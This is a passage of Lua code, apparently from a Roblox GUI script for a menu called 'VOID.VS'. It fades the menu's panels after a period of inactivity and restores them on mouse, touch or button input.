                outer:GetPropertyChangedSignal("Position"):Connect(function()
                    -- follows parent Outer automatically
                end)
            end
        end
        -- also remove any title left inside header/chrome
        local function stripTitle(root)
            if not root then return end
            for _,d in ipairs(root:GetDescendants()) do
                if d.Name == "VoidTitle" and d ~= GuiRefs.voidTitle then
                    pcall(function() d:Destroy() end)
                end
            end
        end
        stripTitle(chromeGroup)
        stripTitle(GuiRefs.inner)
    end)

    local function bump()
        lastInteract = tick()
    end

    local function fadeToIdle()
        if faded then return end
        faded = true
        TweenService:Create(chromeGroup, tiIn, {GroupTransparency = 0.88}):Play()
        -- title image never fades with inner
        pcall(function()
            if GuiRefs.voidTitle then
                GuiRefs.voidTitle.ImageTransparency = 0
                GuiRefs.voidTitle.BackgroundTransparency = 1
            end
        end)
        if bgImageRef and bgImageRef.Visible then
            pcall(function()
                TweenService:Create(bgImageRef, tiIn, {ImageTransparency = 0.1}):Play()
            end)
        end
        -- soft fade inner panel edge so art shows through
        if GuiRefs.inner then
            pcall(function()
                TweenService:Create(GuiRefs.inner, tiIn, {BackgroundTransparency = 0.55}):Play()
            end)
        end
    end

    local function restoreUI()
        bump()
        if not faded then return end
        faded = false
        TweenService:Create(chromeGroup, tiOut, {GroupTransparency = 0}):Play()
        if bgImageRef and bgImageRef.Visible then
            pcall(function()
                TweenService:Create(bgImageRef, tiOut, {ImageTransparency = 0.35}):Play()
            end)
        end
        if GuiRefs.inner then
            pcall(function()
                TweenService:Create(GuiRefs.inner, tiOut, {BackgroundTransparency = 0}):Play()
            end)
        end
    end

    local function onPress(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch
            or inp.UserInputType == Enum.UserInputType.MouseButton2 then
            restoreUI()
        end
    end

    local outer = GuiRefs.outer
    if outer then
        outer.Active = true
        outer.InputBegan:Connect(onPress)
    end
    if chromeGroup then
        chromeGroup.InputBegan:Connect(onPress)
    end
    if GuiRefs.contentFrame then
        GuiRefs.contentFrame.InputBegan:Connect(onPress)
    end
    if GuiRefs.categoryList then
        GuiRefs.categoryList.InputBegan:Connect(onPress)
    end
    -- buttons reset timer
    pcall(function()
        for _, d in ipairs(chromeGroup:GetDescendants()) do
            if d:IsA("TextButton") or d:IsA("ImageButton") then
                d.MouseButton1Click:Connect(function() restoreUI() end)
                d.InputBegan:Connect(onPress)
            end
        end
    end)

    task.spawn(function()
        while outer and outer.Parent do
            if outer.Visible then
                if not faded and (tick() - lastInteract) >= IDLE_SEC then
                    fadeToIdle()
                end
            else
                if faded then
                    faded = false
                    pcall(function() chromeGroup.GroupTransparency = 0 end)
                end
                bump()
            end
            task.wait(0.12)
        end
    end)
end

end)()



print("VOID.VS LOADED")